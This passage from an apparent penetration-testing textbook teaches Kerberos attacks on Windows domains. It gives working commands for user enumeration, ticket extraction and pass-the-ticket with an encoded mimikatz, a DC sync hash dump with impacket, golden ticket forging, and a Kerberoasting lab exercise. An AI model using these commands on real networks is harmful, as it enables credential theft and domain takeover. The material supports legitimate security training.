		<p class="indent">To prevent these attacks, modern Kerberos implementations require that requests include a timestamp encrypted with the user’s password hash. We refer to this extra check as <em>pre-authentication (pre-auth)</em>. But even with preauth present, you can use Metasploit modules to collect Kerberos usernames by performing a dictionary-based attack:</p>
		<p class="programs">msf6 &gt; <span class="codestrong1">use Auxiliary/gather/Kerberos_enumusers</span></p>
		<p class="indent">The <span class="literal">Kerberos_enumuser</span> module will perform the first authentication step with the user IDs in the dictionary and then report information on the use; for example, if a user is present and whether pre-auth is required.</p>
		<p class="indent">Now that I’ve discussed the Kerberos protocol, let’s look at other ways to attack it.</p>
		<h4 class="h4" id="ch15lev10"><strong><em>The Pass-the-Ticket Attack</em></strong></h4>
		<p class="noindent">In a <em>pass-the-ticket</em> attack, a hacker manages to acquire a service ticket, which they can use to access services on the machine. To do this, they extract the response the authentication server sent, the ticket-granting ticket, and the user’s password hash from the LSSAS process on a local machine. The attacker decrypts the response using the user’s password hash and extracts the session key, which they then use to forge a new request for a service ticket. Once the attacker obtains the new service ticket, they can access other services or machines. Tools like mimikatz allow you to execute these types of attacks. Use your encoded version of mimikatz to extract the tickets from the LSSAS process:</p>
		<p class="programs">PS&gt; <span class="codestrong1">mimikatz_encoded.exe "privilege::debug" "sekurlsa::tickets /export"</span></p>
		<p class="indent">Mimikatz outputs the ticket information to the terminal. It also writes each ticket to separate files with the <em>.kirbi</em> extension. The files will be placed in the same directory as the mimikatz executable. Select the ticket associated <span epub:type="pagebreak" id="page_321"/>with the system that you want to access and load it into the memory of the LSSAS process by running the following command:</p>
		<p class="programs">PS&gt; <span class="codestrong1">mimikatz_encode.exe kerberos::ptt "<span class="codeitalic">&lt;Path to ticket file&gt;</span>.kirbi"</span></p>
		<p class="indent">After it’s loaded, you should be able to access the system.</p>
		<h4 class="h4" id="ch15lev11"><strong><em>The Golden Ticket and DC Sync Attacks</em></strong></h4>
		<p class="noindent">Although we didn’t show it in our discussion of the Kerberos protocol, all messages are signed with the password hash associated with the <em>krbtgt</em> account, a special account on all domain controllers with a long and difficult-to-crack password that is automatically generated. However, suppose that an attacker could compromise the domain controller and steal the password hash of the krbtgt account. In that case, they could forge any ticket by signing it with the krbtgt account’s hash. An attacker could then create tickets that they could use years after they’ve compromised a system. This is why it is important to reset the krbtgt account’s password if you suspect there has been an attack. Because this attack allows an attacker to forge any ticket, at any time, it is called a <em>golden ticket</em> attack.</p>
		<p class="indent">You’ll need the krbtgt account’s password hash to create a golden ticket. But how can you obtain the krbtgt password hash without directly compromising the domain controller? Well, when a network administrator adds a new domain controller to the network, the new domain controller asks existing domain controllers to send it a copy of their databases. This request allows the domain controllers to remain in sync. However, these databases also contain password hashes, including the krbtgt account’s password hash. By pretending to be a domain controller performing a sync operation, an attacker can steal the krbtgt account’s password hash. We call this attack a <em>DC sync</em> attack.</p>
		<p class="indent"><em>Impacket</em> is an amazing collection of Python programs that allows hackers to perform network attacks, including the DC sync attack. You can download it by cloning the impacket Git repository:</p>
		<p class="programs">git clone https://github.com/SecureAuthCorp/impacket</p>
		<p class="indent">Perform a DC sync attack by running the <em>secretsdump.py</em> Python program in the <em>impacket</em> folder you just cloned:</p>
		<p class="programs">&gt; <span class="codestrong1">secretsdump.py <span class="codeitalic">&lt;Domain.local&gt;</span>/<span class="codeitalic">&lt;username&gt;</span>:<span class="codeitalic">&lt;password&gt;</span>@<span class="codeitalic">&lt;local machine's IP address&gt;</span></span><br/><br/>
   Administrator:500:0b4a1b98eee5c792aad3b435b51404ee:2cbdec5023a03c12a35444486f09ceab:::<br/><span class="ent">➊</span> krbtgt:502:aa4af3e2e878bda4aad3b435b51404ee:ba70fbbc74ca7d6db22fb2b715ebbf7a:::</p>
		<p class="indent">Each line corresponds to a user’s password hashes. The line at <span class="ent">➊</span>, represents the user krbtgt. All lines have the following structure: <span class="literal">uid:rid:lmhash: nthash</span>, where <span class="literal">uid</span> is the user’s id, <span class="literal">rid</span> is the relative identifier (a code that identifies a user’s role, such as 500 for an administrator), <span class="literal">lmhash</span> is the LAN manager hash, which is a hash that predates the NTLM hash, and <span class="literal">nthash</span> <span epub:type="pagebreak" id="page_322"/>represents the NTLM hash. Because <span class="literal">lmhash</span> uses only seven case-insensitive characters, it’s easily cracked; however, it is included for legacy purposes.</p>
		<p class="indent">Use <span class="literal">nthash</span> to create your golden ticket. The following command creates the ticket and loads it into memory so that it can be used in a pass-the-ticket attack:</p>
		<p class="programs">mimikatz # <span class="codestrong1">kerberos::golden /domain:<span class="codeitalic">&lt;example.local&gt;</span> /sid:<span class="codeitalic">&lt;SID&gt;</span> /user:<span class="codeitalic">&lt;ADMIN</span></span><br/>
     <span class="codestrong1"><span class="codeitalic">USER ID&gt;</span> /krbtgt:<span class="codeitalic">&lt;HASH&gt;</span> /ptt</span></p>
		<p class="indent">Here, we included the <span class="literal">/ptt</span> (pass-the-ticket) flag, which tells mimikatz to associate the ticket with our current session. Now you can log in to any machine with your new admin ticket.</p>
		<h3 class="h3" id="ch15lev12"><strong>Exercise: Kerberoasting</strong></h3>
		<p class="noindent">In the final exercise in this book, you’ll research and execute an attack on your own. The attack that you’ll execute is called <em>Kerberoasting</em>, which is a dictionary-based attack that attempts to crack the password hash used to encrypt the ticket-granting service. Some services are associated with normal users, and thus use regular passwords instead of computer-generated ones. Successfully cracking the ticket-granting service will give you the service’s password, which is the same as the user’s password.</p>
		<p class="indent">Set up a Windows lab environment with a Windows desktop virtual machine and a Windows server to act as your domain controller. Next, try executing some attacks against it. To execute a Kerberoasting attack, use the <em>getuserspns.py</em> impacket script:</p>
		<p class="programs">getuserspns.py <span class="codeitalic">&lt;domain&gt;</span>/<span class="codeitalic">&lt;username&gt;</span>:<span class="codeitalic">&lt;password&gt;</span> -request</p>
	</body>
</html>